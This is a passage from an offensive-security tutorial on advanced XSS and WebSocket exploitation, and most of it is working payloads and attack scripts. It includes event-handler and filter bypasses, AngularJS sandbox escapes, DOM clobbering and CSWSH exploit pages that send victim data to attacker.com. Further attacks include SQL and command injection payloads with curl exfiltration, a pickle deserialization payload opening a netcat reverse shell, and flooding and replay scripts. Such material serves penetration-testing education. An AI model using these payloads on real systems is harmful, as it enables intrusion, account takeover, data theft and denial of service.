<img src=x onerror=location=`javascript:alert\x281\x29`>

<!-- Using throw for execution -->
<img src=x onerror=throw/a/,alert(1),1//>
```

**Space Bypass Techniques:**

```html
<!-- Tab character (0x09) -->
<img src=x onerror	=alert(1)>

<!-- Newline (0x0A) -->
<img src=x onerror
=alert(1)>

<!-- Carriage return (0x0D) -->
<img src=x onerror=alert(1)>

<!-- Form feed (0x0C) -->
<img src=x onerror=alert(1)>

<!-- Forward slash in tag name context -->
<svg/onload=alert(1)>
```

### Context-Specific Event Handlers

**SVG-Specific Handlers:**

```html
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=y>
<svg><animateTransform onbegin=alert(1)>
```

**MathML Handlers ([Inference] - Firefox primarily):**

```html
<math><mtext onmouseover=alert(1)>Hover</mtext></math>
```

---

## Script Gadgets

Script gadgets are JavaScript code patterns in existing libraries that can be exploited for XSS when combined with attacker-controlled input.

### Understanding Script Gadgets

**Concept:** Third-party libraries often contain functions that accept user input and perform dangerous operations (eval, innerHTML, document.write). When attackers control the input to these functions, they can achieve code execution even without injecting `<script>` tags.

### jQuery Gadgets

**jQuery .html() Sink:**

```javascript
// Vulnerable pattern in application code
var userInput = location.hash.slice(1);
$('#content').html(userInput);

// Exploit payload
#<img src=x onerror=alert(1)>
```

**jQuery $(selector) with HTML:**

```javascript
// Vulnerable pattern
var userInput = location.hash.slice(1);
$(userInput).appendTo('body');

// Exploit payload
#<img src=x onerror=alert(1)>
```

**jQuery .load() Method ([Inference] - loads HTML from URL):**

```javascript
// Vulnerable pattern
var url = location.hash.slice(1);
$('#content').load(url);

// Exploit: control URL parameter
#http://attacker.com/xss.html
```

### AngularJS Gadgets

**AngularJS Expression Injection (v1.x):**

```javascript
// Vulnerable template
<div ng-app>{{userInput}}</div>

// Basic payload (AngularJS < 1.6)
{{constructor.constructor('alert(1)')()}}

// Advanced payload for sandboxed versions
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}

// Bypass for AngularJS 1.6+
{{$eval.constructor('alert(1)')()}}
```

**Client-Side Template Injection:**

```html
<!-- Vulnerable pattern -->
<script src="angular.min.js"></script>
<div ng-app ng-csp>
    <div ng-bind-html="userInput"></div>
</div>

<!-- Exploit -->
<img src=x onerror=alert(1)>
```

### Prototype Pollution to Gadget Chain

**Concept:** [Inference] Polluting `Object.prototype` can affect library behavior when properties are accessed on objects without proper checks.

**Example Gadget Chain:**

```javascript
// Step 1: Prototype pollution
Object.prototype.sourceURL = '\u000dalert(1)//';

// Step 2: Trigger gadget in jQuery
$.globalEval('');
// jQuery's globalEval may use sourceURL for script evaluation
```

**Another Example with Lodash:**

```javascript
// Pollute prototype
Object.prototype.sourceURL = '\\u000dalert(1)';

// Trigger via template compilation
_.template('Hello')();
```

### DOMPurify Bypass Gadgets ([Unverified - specific to versions])

**Mutation XSS (mXSS) Patterns:**

```html
<!-- Input after sanitization -->
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>

<!-- Browser parsing creates unexpected DOM structure -->
```

**Namespace Confusion:**

```html
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
```

---

## DOM Clobbering

DOM clobbering exploits how browsers create JavaScript references from HTML elements with `id` or `name` attributes, potentially overwriting expected JavaScript variables.

### Basic DOM Clobbering Concepts

**Automatic Global Variable Creation:**

```html
<!-- HTML with id attribute -->
<img id="test" src="x">

<script>
console.log(test);  // Returns the <img> element
console.log(window.test);  // Same element
</script>
```

**Name Attribute in Forms:**

```html
<form name="config">
    <input name="debug" value="true">
</form>

<script>
console.log(config);  // Returns <form> element
console.log(config.debug);  // Returns <input> element
console.log(config.debug.value);  // Returns "true"
</script>
```

### Exploiting DOM Clobbering

**Overwriting Configuration Objects:**

```html
<!-- Vulnerable JavaScript code -->
<script>
if (window.config && config.debug) {
    // Debug mode logic using config values
    eval(config.callback);  // Dangerous!
}
</script>

<!-- Attack payload -->
<form id="config">
    <input name="debug" value="true">
    <input name="callback" value="alert(1)">
</form>
```

**Clobbering with Anchor Tags:**

```html
<!-- Vulnerable code checks for URL -->
<script>
if (window.endpoint) {
    fetch(endpoint.href).then(/* ... */);
}
</script>

<!-- Attack payload -->
<a id="endpoint" href="http://attacker.com/steal"></a>
```

**HTMLCollection Exploitation:**

```html
<!-- Multiple elements with same name create HTMLCollection -->
<form id="test"></form>
<form id="test"></form>

<script>
console.log(test);  // Returns HTMLCollection
console.log(test.length);  // Returns 2
console.log(test[0]);  // First form
</script>
```

**Clobbering with Nested Properties:**

```html
<!-- Vulnerable code -->
<script>
if (window.config && config.api && config.api.endpoint) {
    fetch(config.api.endpoint);
}
</script>

<!-- Attack payload using iframe name -->
<form id="config">
    <iframe name="api" srcdoc="<a id='endpoint' href='http://attacker.com/steal'></a>"></iframe>
</form>
```

### Advanced DOM Clobbering Techniques

**Clobbering Built-in Properties:**

```html
<!-- Some browsers allow clobbering specific globals -->
<img name="location" href="javascript:alert(1)">
<!-- May affect window.location in specific contexts -->
```

**Clobbering with Shadow DOM ([Unverified - browser-specific]):**

```html
<div id="target">
    <template shadowroot="open">
        <form id="config">
            <input name="debug" value="exploit">
        </form>
    </template>
</div>
```

**Gadget Chains with Clobbering:**

```html
<!-- Step 1: Clobber configuration -->
<form id="config">
    <input name="sanitize" value="false">
</form>

<!-- Step 2: Vulnerable code assumes config.sanitize is boolean -->
<script>
if (!config.sanitize) {  // Checks for truthiness, not boolean
    document.body.innerHTML = userInput;  // XSS!
}
</script>
```

### Defense Bypass via Clobbering

**Bypassing Sanitization Checks:**

```html
<!-- Vulnerable sanitization logic -->
<script>
function sanitize(input) {
    if (window.bypassSanitization) {
        return input;  // Dangerous assumption
    }
    return DOMPurify.sanitize(input);
}
</script>

<!-- Attack -->
<img id="bypassSanitization" src="x">
```

---

## Practical Tool Usage for Advanced XSS

### XSStrike

**Advanced Scanning:**

```bash
# Crawl and fuzz all parameters
xsstrike -u "http://target.com/page" --crawl --level 3

# Custom payload file
xsstrike -u "http://target.com/search?q=test" --file custom_payloads.txt

# DOM XSS scanning
xsstrike -u "http://target.com/#/profile" --dom
```

### DOMPurify Bypass Testing

**Manual Testing Pattern:**

```javascript
// Test in browser console
var dirty = '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>';
var clean = DOMPurify.sanitize(dirty);
document.body.innerHTML = clean;
```

### Browser Developer Tools Workflow

**Testing DOM Clobbering:**

```javascript
// Console commands for detection
Object.keys(window).filter(k => window[k] instanceof HTMLElement);

// Check if specific property is clobbered
Object.getOwnPropertyDescriptor(window, 'config');
```

**Detecting Script Gadgets:**

```javascript
// Override dangerous functions to track usage
const originalEval = eval;
window.eval = function() {
    console.trace('eval called with:', arguments);
    return originalEval.apply(this, arguments);
};
```

---

## Important Testing Considerations

**[Inference]** Modern browsers implement multiple XSS defenses:

- Content Security Policy (CSP)
- X-XSS-Protection headers
- SameSite cookie attributes
- Trusted Types API

**[Unverified]** Bypass effectiveness varies by:

- Browser version and vendor
- CSP configuration strictness
- Framework-specific protections
- WAF detection capabilities

**Related advanced topics:**

- CSP bypass techniques
- Stored XSS exploitation chains
- XSS to CSRF escalation
- Mutation XSS (mXSS) comprehensive vectors
- Blind XSS detection and exploitation

---

# WebSocket Exploitation

## WebSocket Protocol Basics

### Protocol Architecture

WebSocket is a bidirectional, full-duplex communication protocol operating over TCP. It establishes a persistent connection between client and server, distinct from HTTP's request-response model.

**Key Protocol Characteristics:**

- Uses initial HTTP/HTTPS upgrade request (port 80/443)
- Switches to `ws://` or `wss://` (WebSocket Secure) schemes
- Maintains stateful connection after handshake
- Frame-based message transmission
- Lower overhead than HTTP polling

**Frame Structure:**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+
```

**Opcode Values:**

- `0x0` - Continuation frame
- `0x1` - Text frame (UTF-8)
- `0x2` - Binary frame
- `0x8` - Connection close
- `0x9` - Ping
- `0xA` - Pong

**Security Context:**

- Client-to-server frames MUST be masked (XOR with 32-bit key)
- Server-to-client frames MUST NOT be masked
- Origin validation occurs during handshake
- No built-in authentication mechanism

---

## WebSocket Handshake

### Handshake Mechanism

The WebSocket handshake uses HTTP Upgrade mechanism (RFC 6455).

**Client Handshake Request:**

```http
GET /chat HTTP/1.1
Host: example.com:8080
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://example.com
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Extensions: permessage-deflate
```

**Server Handshake Response:**

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
Sec-WebSocket-Protocol: chat
```

### Handshake Key Generation

**Sec-WebSocket-Key Calculation:**

```python
import base64
import os

# Client generates random 16-byte value
nonce = os.urandom(16)
sec_websocket_key = base64.b64encode(nonce).decode('utf-8')
print(f"Sec-WebSocket-Key: {sec_websocket_key}")
```

**Sec-WebSocket-Accept Calculation:**

```python
import base64
import hashlib

# Server concatenates key with magic GUID
GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
key = "dGhlIHNhbXBsZSBub25jZQ=="

accept_key = base64.b64encode(
    hashlib.sha1((key + GUID).encode()).digest()
).decode('utf-8')
print(f"Sec-WebSocket-Accept: {accept_key}")
# Output: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Interception with Burp Suite

**Setup Steps:**

1. Configure browser proxy to `127.0.0.1:8080`
2. Enable WebSocket history in Burp:
    - `Proxy` â†’ `Options` â†’ `WebSockets`
    - Check "Intercept WebSocket messages"

**Intercept Handshake:**

```
Proxy â†’ HTTP History â†’ Filter: Show WebSocket upgrade requests
```

**Modify Handshake Headers:**

```http
# Inject custom headers during upgrade
Sec-WebSocket-Protocol: malicious-protocol
Origin: https://attacker.com
Cookie: session=<stolen_token>
```

### Testing with wscat

**Installation:**

```bash
npm install -g wscat
```

**Basic Connection:**

```bash
# Connect to WebSocket endpoint
wscat -c ws://example.com:8080/chat

# Connect with custom headers
wscat -c ws://example.com/socket \
  -H "Cookie: session=abc123" \
  -H "Origin: https://trusted.com"

# Connect with subprotocol
wscat -c ws://example.com/socket -s chat

# SSL/TLS connection
wscat -c wss://example.com/secure-socket
```

### Python Handshake Manipulation

**Manual Handshake with Raw Sockets:**

```python
import socket
import base64
import hashlib

def create_handshake(host, path, origin):
    key = base64.b64encode(b'0123456789abcdef').decode()
    
    handshake = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Origin: {origin}\r\n"
        "\r\n"
    )
    return handshake, key

# Connect and send handshake
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('example.com', 80))

handshake, key = create_handshake('example.com', '/socket', 'http://attacker.com')
sock.send(handshake.encode())

response = sock.recv(4096).decode()
print(response)
```

### Common Handshake Vulnerabilities

**Missing Origin Validation:**

```bash
# Test with arbitrary origin
wscat -c ws://target.com/socket -H "Origin: https://evil.com"
```

**Subprotocol Injection:**

```http
Sec-WebSocket-Protocol: chat' OR '1'='1
Sec-WebSocket-Protocol: ../../../etc/passwd
```

**Version Downgrade:**

```http
# Try older versions with known vulnerabilities
Sec-WebSocket-Version: 8
Sec-WebSocket-Version: 0
```

---

## Message Manipulation

### Intercepting Messages with Burp Suite

**WebSocket History:**

```
Proxy â†’ WebSockets History
- Shows all WebSocket frames
- Direction indicators (â†’ outbound, â† inbound)
- Message content and length
```

**Intercept Specific Messages:**

```
1. Proxy â†’ Options â†’ WebSocket Interception Rules
2. Add rule: "Intercept messages where content matches: <pattern>"
3. Enable "Intercept WebSocket messages"
```

**Example Interception:**

```json
Original Message (Client â†’ Server):
{"action":"transfer","amount":100,"to":"user123"}

Modified Message:
{"action":"transfer","amount":999999,"to":"attacker"}
```

### Message Fuzzing with wfuzz

**Installation:**

```bash
apt install wfuzz
```

**WebSocket Fuzzing Syntax:**

```bash
# Basic message fuzzing
wfuzz -z file,payloads.txt \
  --ws-endpoint ws://target.com/socket \
  --ws-message '{"cmd":"FUZZ"}'

# Fuzz JSON parameter values
wfuzz -z range,1-1000 \
  --ws-endpoint ws://target.com/api \
  --ws-message '{"user_id":FUZZ}'
```

[Inference] wfuzz may require additional plugins or custom scripts for WebSocket fuzzing as native support varies by version.

### Python Message Manipulation

**Using websocket-client Library:**

```bash
pip install websocket-client
```

**Send Modified Messages:**

```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")
    
    # Parse and manipulate
    data = json.loads(message)
    if 'balance' in data:
        print(f"Original balance: {data['balance']}")

def on_open(ws):
    # Send manipulated message
    payload = {
        "action": "getBalance",
        "user_id": "1' OR '1'='1"  # SQL injection attempt
    }
    ws.send(json.dumps(payload))

ws = websocket.WebSocketApp(
    "ws://target.com/socket",
    on_message=on_message,
    on_open=on_open,
    header={"Cookie": "session=abc123"}
)

ws.run_forever()
```

**Frame-Level Manipulation:**

```python
import websocket
import struct

def create_frame(opcode, payload, mask=True):
    frame = bytearray()
    
    # FIN + Opcode
    frame.append(0x80 | opcode)
    
    # Mask bit + Payload length
    length = len(payload)
    if length < 126:
        frame.append((0x80 if mask else 0x00) | length)
    elif length < 65536:
        frame.append((0x80 if mask else 0x00) | 126)
        frame.extend(struct.pack('!H', length))
    
    # Masking key (if client-to-server)
    if mask:
        import os
        masking_key = os.urandom(4)
        frame.extend(masking_key)
        
        # Apply XOR mask
        masked_payload = bytearray()
        for i, byte in enumerate(payload):
            masked_payload.append(byte ^ masking_key[i % 4])
        frame.extend(masked_payload)
    else:
        frame.extend(payload)
    
    return bytes(frame)

# Text frame example
text_payload = b'{"cmd":"admin"}'
frame = create_frame(0x1, text_payload)
```

### Cross-Site WebSocket Hijacking (CSWSH)

**Vulnerability Condition:**

- WebSocket handshake lacks CSRF token validation
- Relies solely on cookies for authentication
- No Origin header validation

**Attack Payload (HTML):**

```html
<html>
<body>
<script>
var ws = new WebSocket('ws://vulnerable-site.com/chat');

ws.onopen = function() {
    // Send commands using victim's session
    ws.send('{"action":"getPrivateData"}');
};

ws.onmessage = function(event) {
    // Exfiltrate data to attacker server
    fetch('https://attacker.com/log', {
        method: 'POST',
        body: event.data
    });
};
</script>
</body>
</html>
```

**Testing for CSWSH:**

```bash
# Check if connection succeeds with arbitrary origin
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(echo -n test | base64)" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=victim_session" \
  http://target.com/socket
```

### SQL Injection via WebSocket

**Identify Injectable Parameters:**

```json
{"search": "product"}
{"user_id": 123}
{"filter": "category='electronics'"}
```

**Injection Payloads:**

```json
// Boolean-based blind
{"user_id": "1' AND '1'='1"}
{"user_id": "1' AND '1'='2"}

// Time-based blind
{"search": "' OR SLEEP(5)--"}
{"filter": "'; WAITFOR DELAY '00:00:05'--"}

// Union-based
{"user_id": "1' UNION SELECT null,username,password FROM users--"}
```

**Automated Testing with sqlmap:**

```bash
# Capture WebSocket message with Burp, save to file: ws_request.txt
# Format:
# ws://target.com/socket
# {"user_id":"*"}

sqlmap -r ws_request.txt \
  --level=5 \
  --risk=3 \
  --batch \
  --dump
```

[Unverified] sqlmap WebSocket support may require custom tamper scripts or proxy configurations depending on version.

### Command Injection via WebSocket

**Vulnerable Parameter Example:**

```json
{"action": "ping", "host": "8.8.8.8"}
```

**Injection Payloads:**

```json
// Command chaining
{"host": "8.8.8.8; id"}
{"host": "8.8.8.8 && cat /etc/passwd"}
{"host": "8.8.8.8 | whoami"}

// Blind command injection
{"host": "8.8.8.8; curl http://attacker.com/$(whoami)"}
{"host": "8.8.8.8; nslookup $(hostname).attacker.com"}

// Time-based detection
{"host": "8.8.8.8; sleep 10"}
```

### XSS via WebSocket Messages

**Reflected XSS in WebSocket Response:**

```python
import websocket

ws = websocket.create_connection("ws://target.com/chat")

# Send XSS payload
ws.send('{"message":"<img src=x onerror=alert(1)>"}')

response = ws.recv()
print(response)
# If response includes unescaped payload, XSS exists
```

**Stored XSS via WebSocket:**

```json
// Store malicious message
{"action":"post","content":"<script>fetch('//attacker.com?c='+document.cookie)</script>"}

// Payload triggers when other users view chat history
```

### Binary Message Manipulation

**Send Binary Frame:**

```python
import websocket

ws = websocket.create_connection("ws://target.com/upload")

# Binary data (opcode 0x2)
binary_payload = b'\x89PNG\r\n\x1a\n...'  # Malicious PNG header
ws.send_binary(binary_payload)

response = ws.recv()
```

**Serialize/Deserialize Attacks:**

```python
import pickle
import base64

# Create malicious pickle payload
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('nc attacker.com 4444 -e /bin/sh',))

payload = base64.b64encode(pickle.dumps(Exploit()))

# Send via WebSocket
ws.send(payload.decode())
```

### Rate Limiting and DoS

**Message Flooding:**

```python
import websocket
import threading

def flood_websocket(url, count):
    ws = websocket.create_connection(url)
    for i in range(count):
        ws.send(f'{{"msg":"flood_{i}"}}')
    ws.close()

# Launch multiple threads
for _ in range(50):
    threading.Thread(target=flood_websocket, args=("ws://target.com/socket", 1000)).start()
```

**Slowloris-style Attack:**

```python
ws = websocket.create_connection("ws://target.com/socket")

# Keep connection open, send minimal data slowly
import time
while True:
    ws.send('{"ping":""}')
    time.sleep(60)  # Send once per minute to maintain connection
```

### Authentication Bypass Techniques

**Token Manipulation in Messages:**

```json
// Original message
{"token": "user_jwt_token", "action": "getData"}

// Modified message - inject admin token
{"token": "admin_jwt_token", "action": "getData"}
```

**Session Fixation:**

```python
# Establish connection with known session ID
ws = websocket.create_connection(
    "ws://target.com/socket",
    header=["Cookie: PHPSESSID=attacker_controlled_session"]
)
```

### Message Replay Attacks

**Capture Legitimate Message:**

```json
{"action":"withdraw","amount":100,"timestamp":1697456789,"signature":"abc123"}
```

**Replay Without Timestamp Validation:**

```python
# Replay same message multiple times
for _ in range(10):
    ws.send('{"action":"withdraw","amount":100,"timestamp":1697456789,"signature":"abc123"}')
```

### Tools Summary

**wscat** - Interactive WebSocket client

```bash
wscat -c <url> [-H header] [-s subprotocol]
```

**Burp Suite** - Intercept and modify WebSocket traffic

- WebSockets history tab
- Interception rules
- Repeater for replaying messages

**websocat** - Netcat-like tool for WebSockets

```bash
# Install
cargo install websocat

# Connect
websocat ws://target.com/socket

# With authentication
echo '{"auth":"token"}' | websocat ws://target.com/socket
```

**wsrepl** - WebSocket REPL

```bash
npm install -g wsrepl
wsrepl ws://target.com/socket
```

Python libraries: `websocket-client`, `websockets` (async)

---

## WebSocket Protocol Fundamentals

WebSockets provide full-duplex communication channels over a single TCP connection. Unlike HTTP, WebSocket connections remain open, enabling real-time bidirectional data flow between client and server. The protocol operates on ports 80 (ws://) and 443 (wss://) and begins with an HTTP upgrade handshake.

**Handshake Example:**

```
GET /chat HTTP/1.1
Host: vulnerable.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://vulnerable.example.com
```

The server responds with HTTP 101 Switching Protocols, after which communication occurs through WebSocket frames rather than HTTP messages.

## Cross-Site WebSocket Hijacking (CSWSH)

CSWSH exploits occur when WebSocket connections fail to properly validate the Origin header or lack CSRF token verification during the handshake. This allows attackers to establish WebSocket connections from malicious origins and perform unauthorized actions.

### Vulnerability Identification

**Manual Testing:**

```bash
# Intercept WebSocket handshake with Burp Suite
# Proxy â†’ WebSockets history â†’ Select connection â†’ Right-click â†’ "Send to Repeater"

# Test Origin header manipulation
# Change Origin header to arbitrary value
Origin: https://attacker.com

# Check if connection establishes successfully
# Vulnerable if server accepts connection without validation
```

**Critical Headers to Test:**

- `Origin` - Should be validated against whitelist
- `Sec-WebSocket-Key` - Randomized nonce, but not authentication
- `Cookie` - Session tokens may be automatically included
- Custom headers - Application-specific authentication tokens

### Exploitation Methodology

**Step 1: Enumerate WebSocket Endpoints**

```bash
# Using wscat (install: npm install -g wscat)
wscat -c ws://target.com/socket

# Test with SSL/TLS
wscat -c wss://target.com/socket

# Connect with custom headers
wscat -c ws://target.com/socket -H "Cookie: session=abc123"

# Send test messages after connection
> {"action":"subscribe","channel":"admin"}
```

**Step 2: Analyze Message Structure**

```bash
# Using websocat (install: cargo install websocat or apt install websocat)
websocat ws://target.com/chat

# Capture and analyze multiple messages
websocat -v ws://target.com/socket 2>&1 | tee websocket_traffic.log

# Test message formats
echo '{"type":"message","content":"test"}' | websocat ws://target.com/socket
```

**Step 3: Create CSWSH Exploit Page**

```html
<!DOCTYPE html>
<html>
<head><title>CSWSH Exploit</title></head>
<body>
<script>
// Establish WebSocket connection from attacker's origin
var ws = new WebSocket('ws://vulnerable.example.com/socket');

ws.onopen = function() {
    console.log('Connection established');
    
    // Send malicious payload
    ws.send(JSON.stringify({
        'action': 'transfer',
        'amount': 1000,
        'to_account': 'attacker_account'
    }));
    
    // Request sensitive data
    ws.send(JSON.stringify({
        'action': 'get_user_data',
        'user_id': 'admin'
    }));
};

ws.onmessage = function(event) {
    console.log('Received:', event.data);
    
    // Exfiltrate data to attacker server
    fetch('https://attacker.com/log', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(error) {
    console.log('Error:', error);
};
</script>
</body>
</html>
```

**Step 4: Advanced Exploitation with Authentication Bypass**

```html
<script>
// Target WebSocket with session cookies
var ws = new WebSocket('ws://vulnerable.example.com/socket');

ws.onopen = function() {
    // If server checks Origin after connection, try reconnection
    if (ws.readyState === WebSocket.OPEN) {
        // Enumerate available actions
        var actions = ['getUserInfo', 'getMessages', 'getSettings', 'updateProfile'];
        
        actions.forEach(function(action) {
            ws.send(JSON.stringify({'command': action}));
        });
    }
};

// Handle responses and extract sensitive data
var exfiltratedData = [];
ws.onmessage = function(event) {
    var data = JSON.parse(event.data);
    exfiltratedData.push(data);
    
    // Send to attacker-controlled server
    if (exfiltratedData.length > 0) {
        navigator.sendBeacon('https://attacker.com/collect', 
            JSON.stringify(exfiltratedData));
    }
};
</script>
```

### Testing with Burp Suite

**Burp Suite WebSocket Testing:**

1. Enable "WebSockets history" in Proxy â†’ Options
2. Intercept WebSocket upgrade request
3. Send to Repeater for manual testing
4. Modify Origin header to test validation
5. Use Intruder for fuzzing WebSocket messages

**WebSocket Payload Fuzzing:**

```
# In Burp Intruder, target WebSocket message
{"action":"Â§testÂ§","data":"Â§payloadÂ§"}

# Common payload positions:
- Action/command parameters
- Data fields
- User identifiers
- Channel/room names
```

## WebSocket Enumeration

### Discovery Techniques

**JavaScript Analysis:**

```bash
# Extract WebSocket URLs from JavaScript files
curl -s https://target.com/app.js | grep -oP 'wss?://[^"'\'']+' | sort -u

# Using meg for mass endpoint discovery
meg --verbose /wordlists/websocket-endpoints.txt https://target.com

# Search for WebSocket initialization patterns
curl -s https://target.com/app.js | grep -E 'new WebSocket|socket\.io|sockjs'
```

**Browser DevTools Inspection:**

```
1. Open DevTools â†’ Network tab
2. Filter by "WS" (WebSocket)
3. Refresh application
4. Inspect WebSocket connections
5. Monitor messages in real-time
6. Copy messages for analysis
```

**Automated Enumeration with Python:**

```python
import websocket
import json

def enumerate_websocket(url):
    """Enumerate WebSocket endpoint responses"""
    
    def on_message(ws, message):
        print(f"[+] Received: {message}")
        try:
            data = json.loads(message)
            print(f"[+] Parsed: {json.dumps(data, indent=2)}")
        except:
            pass
    
    def on_error(ws, error):
        print(f"[-] Error: {error}")
    
    def on_open(ws):
        print(f"[+] Connected to {url}")
        
        # Test common message formats
        test_payloads = [
            '{"type":"subscribe"}',
            '{"action":"list"}',
            '{"cmd":"help"}',
            '{"method":"info"}',
            '{"request":"status"}'
        ]
        
        for payload in test_payloads:
            print(f"[*] Sending: {payload}")
            ws.send(payload)
    
    ws = websocket.WebSocketApp(url,
                                on_message=on_message,
                                on_error=on_error,
                                on_open=on_open)
    
    ws.run_forever()

# Usage
enumerate_websocket("ws://target.com/socket")
```

**Nuclei Templates for WebSocket Discovery:**

```yaml
id: websocket-enum
info:
  name: WebSocket Endpoint Enumeration
  severity: info

requests:
  - raw:
      - |
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==
        Sec-WebSocket-Version: 13
    
    payloads:
      path:
        - socket
        - ws
        - websocket
        - socket.io
        - api/socket
        - chat
        - stream
        - live
    
    matchers:
      - type: status
        status:
          - 101
```

### Message Format Analysis

**Common WebSocket Message Structures:**

```json
// JSON-RPC format
{"jsonrpc":"2.0","method":"subscribe","params":["channel1"],"id":1}

// Action-based format
{"action":"getMessage","messageId":123}

// Socket.io format
42["message",{"user":"admin","text":"hello"}]

// STOMP protocol
CONNECT
accept-version:1.2
host:target.com

// Custom binary format (requires reverse engineering)
```

**Message Type Identification:**

```python
import websocket
import re

def identify_message_format(url):
    formats_detected = []
    
    def on_message(ws, message):
        # JSON detection
        try:
            json.loads(message)
            formats_detected.append("JSON")
        except:
            pass
        
        # Socket.io detection
        if re.match(r'^\d+\[', message):
            formats_detected.append("Socket.io")
        
        # STOMP detection
        if message.startswith(('CONNECT', 'SEND', 'SUBSCRIBE')):
            formats_detected.append("STOMP")
        
        # Binary detection
        if isinstance(message, bytes):
            formats_detected.append("Binary")
        
        print(f"[+] Format: {set(formats_detected)}")
    
    ws = websocket.WebSocketApp(url, on_message=on_message)
    ws.run_forever(ping_interval=10, ping_timeout=5)
```

## Real-Time Data Interception

### Intercepting WebSocket Traffic with mitmproxy

**Installation and Basic Usage:**

```bash
# Install mitmproxy
apt install mitmproxy  # or pip install mitmproxy

# Start mitmproxy with WebSocket support
mitmproxy --mode regular --ssl-insecure

# Start mitmweb for web interface
mitmweb --mode regular --ssl-insecure --web-port 8081
```

**Custom mitmproxy Script for WebSocket Interception:**

```python
# websocket_intercept.py
from mitmproxy import http, websocket
import json

class WebSocketInterceptor:
    def websocket_message(self, flow: websocket.WebSocketFlow):
        """Intercept and modify WebSocket messages"""
        
        message = flow.messages[-1]
        
        # Log all messages
        print(f"[{message.from_client and 'CLIENT' or 'SERVER'}] {message.content}")
        
        # Modify client messages
        if message.from_client:
            try:
                data = json.loads(message.content)
                
                # Inject admin privilege
                if 'user' in data:
                    data['user']['role'] = 'admin'
                    message.content = json.dumps(data)
                    print(f"[*] Modified message: {message.content}")
                
            except json.JSONDecodeError:
                pass
        
        # Extract sensitive data from server
        else:
            try:
                data = json.loads(message.content)
                
                # Look for sensitive fields
                sensitive_keys = ['password', 'token', 'secret', 'api_key', 'ssn']
                for key in sensitive_keys:
                    if key in str(data).lower():
                        print(f"[!] SENSITIVE DATA: {data}")
                        
                        # Log to file
                        with open('websocket_sensitive.log', 'a') as f:
                            f.write(f"{json.dumps(data)}\n")
                            
            except json.JSONDecodeError:
                pass
    
    def websocket_start(self, flow: http.HTTPFlow):
        """Log WebSocket connection establishment"""
        print(f"[+] WebSocket connection: {flow.request.pretty_url}")

addons = [WebSocketInterceptor()]
```

**Running Custom Script:**

```bash
# Run mitmproxy with custom script
mitmproxy -s websocket_intercept.py --ssl-insecure

# Configure browser/application to use proxy
# HTTP Proxy: 127.0.0.1:8080
# HTTPS Proxy: 127.0.0.1:8080
```

### Browser Extension Interception

**Custom Browser Extension for WebSocket Monitoring:**

```javascript
// manifest.json (Chrome Extension)
{
  "manifest_version": 3,
  "name": "WebSocket Monitor",
  "version": "1.0",
  "permissions": ["webRequest", "webRequestBlocking", "<all_urls>"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_start"
  }]
}

// content.js - Inject WebSocket interception
(function() {
    const originalWebSocket = window.WebSocket;
    
    window.WebSocket = function(url, protocols) {
        console.log('[WebSocket] New connection:', url);
        
        const ws = new originalWebSocket(url, protocols);
        
        // Intercept send
        const originalSend = ws.send;
        ws.send = function(data) {
            console.log('[WebSocket] Sending:', data);
            
            // Send to background script for logging
            window.postMessage({
                type: 'WEBSOCKET_SEND',
                data: data,
                url: url
            }, '*');
            
            return originalSend.apply(this, arguments);
        };
        
        // Intercept onmessage
        ws.addEventListener('message', function(event) {
            console.log('[WebSocket] Received:', event.data);
            
            window.postMessage({
                type: 'WEBSOCKET_RECEIVE',
                data: event.data,
                url: url
            }, '*');
        });
        
        return ws;
    };
})();
```

### Python-based Real-Time Interception Proxy

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

class WebSocketProxy:
    """Transparent WebSocket proxy for traffic interception"""
    
